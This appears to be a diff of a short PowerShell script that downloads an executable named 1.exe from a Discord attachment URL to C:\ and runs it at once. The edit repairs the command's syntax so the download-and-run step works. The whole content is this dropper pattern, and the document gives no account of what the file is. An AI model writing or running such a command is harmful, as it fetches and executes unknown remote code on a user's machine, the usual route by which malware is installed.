@@ -1,1 +1,2 @@
-Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/1223792396718837800/1281355014580994105/1.exe?ex=66db6a59&is=66da18d9&hm=4314102e8fc6932dd223c9b11459934f889afd8adadd13a18f51e082260518a5&"; -OutFile "C:\1.exe"; Start-Process -FilePath "C:\1.exe";
+Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/1223792396718837800/1281355014580994105/1.exe" -OutFile "C:\1.exe"
+Start-Process -FilePath "C:\1.exe"
